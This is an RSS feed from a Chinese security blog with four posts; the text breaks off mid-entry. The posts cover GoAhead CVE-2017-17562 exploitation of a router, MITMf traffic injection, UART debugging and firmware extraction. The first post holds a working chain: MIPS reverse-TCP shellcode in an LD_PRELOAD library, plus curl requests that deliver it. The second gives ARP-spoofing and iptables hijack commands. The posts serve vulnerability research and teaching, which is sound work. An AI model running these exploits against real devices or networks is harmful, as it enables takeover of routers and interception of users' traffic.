<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Yaseng</title>
  
  <subtitle>By pass the token</subtitle>
  <link href="/rss.xml" rel="self"/>
  
  <link href="http://yaseng.org/"/>
  <updated>2017-12-27T08:10:35.000Z</updated>
  <id>http://yaseng.org/</id>
  
  <author>
    <name>Yaseng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战</title>
    <link href="http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html"/>
    <id>http://yaseng.org/GoAhead-CVE-2017-17562-analysis-and-pwn-a-router.html</id>
    <published>2017-12-25T16:00:00.000Z</published>
    <updated>2017-12-27T08:10:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要分析了该漏洞详情，并在某款路由器上成功复现，反弹shell。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>   这个漏洞出现在goahead/src/cgi.c:cgihandler函数中，它使用http请求参数中的键值对来初始化新进程的envp参数，在此处只对“REMOTE_HOST”和“HTTP_AUTHORIZATION”参数进行了判断，其他参数全部默认信任。</p><p><img src="http://p1aqjecep.bkt.clouddn.com/15137816099569.jpg" alt=""></p><p>随后，该函数又将子进程标准输入输出指定到了一个临时文件，而这个临时文件是由post请求的数据部分初始化的，最后launchCgi函数使用从http请求中得到的参数和标准输入输出创建了cgi脚本进程。<br><img src="http://p1aqjecep.bkt.clouddn.com/15137816744632.jpg" alt=""></p><p>查看goahead的elf header可以得到其interp段依赖链接器“/lib64/ld-linux-x86-64.so.2”，动态链接器是在链接过程中最先运行的代码，它用来加载目标程序的共享库和符号表。<br><img src="http://p1aqjecep.bkt.clouddn.com/15137935699186.jpg" alt=""></p><p>在链接器链接过程中会根据环境变量的值进行不同的操作，其中LD_PRELOAD变量可以指定一个共享库列表，链接器会优先加载此列表中共享库。<br>如果我们在http请求中指定LD_PRELOAD环境变量，此变量将被当作启动cgi脚本的参数传递给链接器，从而可以在cgi脚本启动之前执行任意.so文件，由于post请求中的数据被保存到/tmp文件夹中的一个临时文件中，而launchCgi函数又将cgi脚本的标准输入输出指定到了该临时文件，因此我们可以远程向目标写入一个.so文件，并将LD_PRELOAD指定为“/proc/self/fd/0”来间接引用post请求数据创建的临时文件，从而在目标系统上执行任意代码。</p><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><h3 id="调试设备"><a href="#调试设备" class="headerlink" title="调试设备"></a>调试设备</h3><p>为了验证该漏洞的真实危害性，找了B-LINK的一款路由器来做测试，首先通过路由器上的UART串口，进入路由器的调试窗口。<br><img src="http://p1aqjecep.bkt.clouddn.com/IMG_2461.jpg" alt="IMG_2461"></p><p>查看web server 是否 goahead 并且有cgi程序。</p><p><img src="http://p1aqjecep.bkt.clouddn.com/debug.jpg" alt="debug"></p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>有四个cgi文件，找到一个能使用的upload_settings.cgi(需要登陆）</p><p><img src="http://p1aqjecep.bkt.clouddn.com/15137864957443.jpg" alt=""></p><p>此路由器的系统为 mipsel，原作者没有给出mips小端格式的测试so，使用mipsel交叉编译Buildroot编译一个</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pentest@ubuntu:~/buildroot$ cat   mipsel-hw.c</span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line">static void before_main(void)</span><br><span class="line">&#123;</span><br><span class="line">    write(1, <span class="string">"Hello: World!\n"</span>, 14);</span><br><span class="line">&#125;</span><br><span class="line">pentest@ubuntu:~/buildroot$ ./mipsel-linux-gcc -shared -fPIC  mipsel-hw.c -o mipsel-hw.so</span><br><span class="line">pentest@ubuntu:~/buildroot$ file mipsel-hw.so</span><br><span class="line">mipsel-hw.so: ELF 32-bit LSB shared object, MIPS, MIPS32 version 1 (SYSV), dynamically linked, not stripped</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary @payloads/mipsel-hw.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0 -i</span><br></pre></td></tr></table></figure><p><img src="http://p1aqjecep.bkt.clouddn.com/15137866081821.jpg" alt=""></p><p>回显成功，说明漏洞存在。</p><h3 id="生成-payload"><a href="#生成-payload" class="headerlink" title="生成 payload"></a>生成 payload</h3><p>使用routesplite 生成一个mipsel 下的reverse_tcp shellcode 。<br><img src="http://p1aqjecep.bkt.clouddn.com/15137880896364.jpg" alt=""></p><p>写入动态链接库中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> sc[] = &#123;</span><br><span class="line">    <span class="string">"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04"</span></span><br><span class="line">    <span class="string">"\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20"</span></span><br><span class="line">    <span class="string">"\x80\x01\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27"</span></span><br><span class="line">    <span class="string">"\x20\x80\x01\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24"</span></span><br><span class="line">    <span class="string">"\x0c\x09\x09\x01\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09"</span></span><br><span class="line">    <span class="string">"\x01\xc9\x0f\x02\x24\x0c\x09\x09\x01\x15\xb3\x05\x3c\x02\x00"</span></span><br><span class="line">    <span class="string">"\xa5\x34\xf8\xff\xa5\xaf\x10\x67\x05\x3c\xc0\xa8\xa5\x34\xfc"</span></span><br><span class="line">    <span class="string">"\xff\xa5\xaf\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01"</span></span><br><span class="line">    <span class="string">"\x4a\x10\x02\x24\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08"</span></span><br><span class="line">    <span class="string">"\x35\xec\xff\xa8\xaf\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff"</span></span><br><span class="line">    <span class="string">"\xa8\xaf\xff\xff\x07\x28\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec"</span></span><br><span class="line">    <span class="string">"\xff\xa4\x23\xec\xff\xa8\x23\xf8\xff\xa8\xaf\xf8\xff\xa5\x23"</span></span><br><span class="line">    <span class="string">"\xec\xff\xbd\x27\xff\xff\x06\x28\xab\x0f\x02\x24\x0c\x09\x09"</span></span><br><span class="line">    <span class="string">"\x01"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">static void before_main(void) __attribute__((constructor));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">before_main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>(*s)(<span class="keyword">void</span>);</span><br><span class="line">    s = sc;</span><br><span class="line">    s();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Buildroot编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mipsel-linux-gcc -shared -fPIC mipsel-reverse-tcp.c -o mipsel-reverse-tcp.so</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>本地 nc 监听 5555 端口，把生成的so文件post到目标</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST   -b  <span class="string">"user=admin;platform=0"</span>  --data-binary @payloads/mipsel-reverse-tcp.so   http://192.168.16.1/cgi-bin/upload_settings.cgi?LD_PRELOAD=/proc/self/fd/0</span><br></pre></td></tr></table></figure><p><img src="http://p1aqjecep.bkt.clouddn.com/15137897078140.jpg" alt=""></p><p>成功反弹shell<br><img src="http://p1aqjecep.bkt.clouddn.com/15137898902411.jpg" alt=""></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><ol><li>在挖掘IOT设备应用层漏洞时，也需要去关注系统组件的安全。</li><li>如果goahead 的cgi 程序无需登录可以访问，可以直接配合csrf 打内网。</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>Remote LD_PRELOAD Exploitation   <a href="https://www.elttam.com.au/blog/goahead" target="_blank" rel="noopener">https://www.elttam.com.au/blog/goahead</a></li><li>routesplite  <a href="https://github.com/reverse-shell/routersploit" target="_blank" rel="noopener">https://github.com/reverse-shell/routersploit</a></li><li>硬件调试  <a href="http://future-sec.com/iot-security-hardware-debuging.html" target="_blank" rel="noopener">http://future-sec.com/iot-security-hardware-debuging.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;GoAhead Web Server 广泛应用于嵌入式设备中，最近其出现了一个高危漏洞，在开启CGI的情况下，可以远程代码执行，据此本文简要
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="goahead" scheme="http://yaseng.org/tags/goahead/"/>
    
  </entry>
  
  <entry>
    <title>使用MITMF中间人攻击非80端口的HTTP</title>
    <link href="http://yaseng.org/using-MITMF-attack-not-80-port-http.html"/>
    <id>http://yaseng.org/using-MITMF-attack-not-80-port-http.html</id>
    <published>2017-12-20T16:00:00.000Z</published>
    <updated>2017-12-27T08:11:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在实际使用中，发现一个问题，无法劫持修改非80端口 HTTP数据，例如注入js 替换字符串。<br>例如注入一段js</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  python mitmf.py  -i wlan0 --spoof --arp --target  172.18.219.3 --gateway  172.18.219.1  --inject --html-payload <span class="string">'&lt;script&gt;alert(0)&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure><p>victim 访问<br><a href="http://yaseng.org/project">http://yaseng.org/project</a></p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129397954576.jpg" alt=""></p><p>访问非80端口的http web<br><a href="http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml" target="_blank" rel="noopener">http://www.jcr.cacrnet.org.cn:8080/mmxb/CN/volumn/home.shtml</a><br>无任何提示  </p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/15129398489571.jpg" alt=""></p><p>attack 端</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot35.jpg" alt="img"></p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>简单看了一下代码<br>MITMf/core/utils.py   line:84</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HTTP</span><span class="params">(self, http_redir_port)</span>:</span></span><br><span class="line">    log.debug(<span class="string">"Setting iptables HTTP redirection rule from port 80 to &#123;&#125;"</span>.format(http_redir_port))</span><br><span class="line">    os.system(<span class="string">'iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port &#123;&#125;'</span>.format(http_redir_port))</span><br></pre></td></tr></table></figure><p>iptables 把80端口的mitmf 监听的10000端口，很显然，需要劫持哪个端口，加一条规则就行了。<br>例如 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo  iptables -t nat -A PREROUTING -p tcp --destination-port 8080 -j REDIRECT --to-port  10000</span><br></pre></td></tr></table></figure><p>attack</p><p><img src="http://ozuqqvmm5.bkt.clouddn.com/Screenshot36.jpg" alt="mg"><br>victim<br><img src="http://ozuqqvmm5.bkt.clouddn.com/15129405294732.jpg" alt=""></p><h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>使用mitmf 来绕过HSTS站点抓取登陆明文  <a href="http://yaseng.org/hsts-bypass-with-mitmf.html">http://yaseng.org/hsts-bypass-with-mitmf.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;说明&quot;&gt;&lt;a href=&quot;#说明&quot; class=&quot;headerlink&quot; title=&quot;说明&quot;&gt;&lt;/a&gt;说明&lt;/h2&gt;&lt;p&gt;MITMf 是一款可拓展性很高的中间人攻击框架，基于代理工具sergio-proxy修改而来。&lt;/p&gt;
&lt;h2 id=&quot;问题&quot;&gt;&lt;a hre
      
    
    </summary>
    
      <category term="web安全" scheme="http://yaseng.org/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="web安全" scheme="http://yaseng.org/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MITMf" scheme="http://yaseng.org/tags/MITMf/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-串口调试</title>
    <link href="http://yaseng.org/iot-security-hardware-debuging.html"/>
    <id>http://yaseng.org/iot-security-hardware-debuging.html</id>
    <published>2017-12-04T16:00:00.000Z</published>
    <updated>2017-12-27T08:02:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。</p><h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image65.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image66.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image67.jpg" alt="img"><br>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image68.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image69.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image70.jpg" alt="img"><br>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image101.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image102.jpg" alt="img"><br>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image71.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image72.jpg" alt="img"></p><h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image73.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image35.jpg" alt="img"><br>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image74.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image75.jpg" alt="img"></p><h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image76.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image77.jpg" alt="img"><br>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image78.jpg" alt="img"></p><h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image79.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image80.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image81.jpg" alt="img"></p><h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image82.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image83.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image84.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image85.jpg" alt="img"><br>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image86.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image87.jpg" alt="img"></p><h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image88.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image89.jpg" alt="img"><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image90.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image91.jpg" alt="img"></p><h3 id="案例六：调试某语音机器人"><a href="#案例六：调试某语音机器人" class="headerlink" title="案例六：调试某语音机器人"></a>案例六：调试某语音机器人</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image122.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image123.jpg" alt="img"><br>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image124.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image125.jpg" alt="img"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://yaseng.org/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="UART串口调试" scheme="http://yaseng.org/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-固件提取</title>
    <link href="http://yaseng.org/iot-security-hardware-obtain.html"/>
    <id>http://yaseng.org/iot-security-hardware-obtain.html</id>
    <published>2017-11-26T16:00:00.000Z</published>
    <updated>2017-12-27T08:02:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇初步介绍一些硬件基础知识和分析硬件所需要的基本工具，本篇将讲述利用编程器直接读取芯片固件的方法。</p><h2 id="编程器读取"><a href="#编程器读取" class="headerlink" title="编程器读取"></a>编程器读取</h2><p>通过夹具夹住芯片引脚，然后连接编程器读取芯片内容，通过编程器连接芯片需要注意引脚的顺序，在IC芯片上都会有一个小点，大多数情况下，小点对应的引脚即为芯片的第一脚，而连接编程器的导线也需要插入编程器上相应的引脚。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image36.jpg" alt="img"></p><h3 id="案例一：读取中控F7门禁固件"><a href="#案例一：读取中控F7门禁固件" class="headerlink" title="案例一：读取中控F7门禁固件"></a>案例一：读取中控F7门禁固件</h3><p>拆掉门禁外壳，通过电路图和芯片印字分析，在主板上有一颗FM25F04A存储芯片，通过夹具连接芯片到编程器，在通过专用编程器软件，对该芯片进行读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image37.jpg" alt="img"></p><p>连接完成，确定引脚接线正确后，打开编程器对应软件，通过智能识别芯片ID，即可开始读取固件工作。<br>如无法识别，可根据印字说明，尝试类似的型号，一般情况下兼容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image38.jpg" alt="img"></p><p>点击读取，即可开始固件提取，成功之后会保存为BIN格式文件，打开即可看到16进制的内容，为下一步分析提供基础。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image39.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image40.jpg" alt="img"></p><h3 id="案例二：读取某智能摄像头固件"><a href="#案例二：读取某智能摄像头固件" class="headerlink" title="案例二：读取某智能摄像头固件"></a>案例二：读取某智能摄像头固件</h3><p>拆掉摄像头外壳，通过分析PCB上的各个IC，找到Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image41.jpg" alt="img"></p><p>在显微镜下，可以看到是一颗25L64型号的Flash芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image118.jpg" alt="img"></p><p>用夹具连接各引脚，并和编程器连接，进行固件读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image42.jpg" alt="img"></p><p>识别到芯片型号为GD25Q64，点击读取，读取完毕后按照提示保存到文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image43.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image44.jpg" alt="img"></p><p>打开保存的BIN文件或者查看缓冲区，即可看到固件内容。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image45.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image46.jpg" alt="img"></p><p>在Ubuntu中，用binwalk解包固件，做进一步分析。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image116.jpg" alt="img"></p><h3 id="案例三：读取某智能摄像头固件"><a href="#案例三：读取某智能摄像头固件" class="headerlink" title="案例三：读取某智能摄像头固件"></a>案例三：读取某智能摄像头固件</h3><p>打开外壳，在PCB背面发现一颗FLASH存储芯片<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image47.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image48.jpg" alt="img"></p><p>通过显微镜发现芯片型号为25L128。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image120.jpg" alt="img"></p><p>连接编程器读取固件并保存。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image49.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image50.jpg" alt="img"></p><h3 id="案例四：读取某路由器固件"><a href="#案例四：读取某路由器固件" class="headerlink" title="案例四：读取某路由器固件"></a>案例四：读取某路由器固件</h3><p>打开外壳，发现PCB上有一颗Flash存储器，但厂商出于安全考虑，把芯片印字涂抹掉了。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image52.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image119.jpg" alt="img"></p><p>在不知道芯片型号的情况下，我们连接该芯片，让编程器去尝试读取。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image51.jpg" alt="img"></p><p>通过智能识别，发现编程器无法识别出具体型号，而因为Flash存储芯片的种类多样，通过查找又无法获得该路由器的具体参数，这时我们通过UART串口，读取出UBOOT启动信息，串口输出里面发现了该芯片型号为W25Q128BV。（下一篇将会重点介绍关于串口调试的方法）<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image54.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image53.jpg" alt="img"></p><p>在编程器中选择该型号，成功提取出固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image55.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image56.jpg" alt="img"></p><p>用binwalk解包固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image115.jpg" alt="img"></p><h3 id="案例五：读取某智能电饭锅固件"><a href="#案例五：读取某智能电饭锅固件" class="headerlink" title="案例五：读取某智能电饭锅固件"></a>案例五：读取某智能电饭锅固件</h3><p>拆掉外壳，背面嵌有一块PCB，反面是WIFI处理芯片，正面为存储器，连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image57.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image58.jpg" alt="img"></p><p>通过印字分析为25芯片，存储大小为2M字节，尝试该型号芯片，成功读取固件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image59.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image60.jpg" alt="img"></p><h3 id="案例六：读取某网络监控摄像机固件"><a href="#案例六：读取某网络监控摄像机固件" class="headerlink" title="案例六：读取某网络监控摄像机固件"></a>案例六：读取某网络监控摄像机固件</h3><p>在PCB上找到一块25L128型号的Flash存储芯片。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image62.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image121.jpg" alt="img"></p><p>通过夹具连接编程器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image61.jpg" 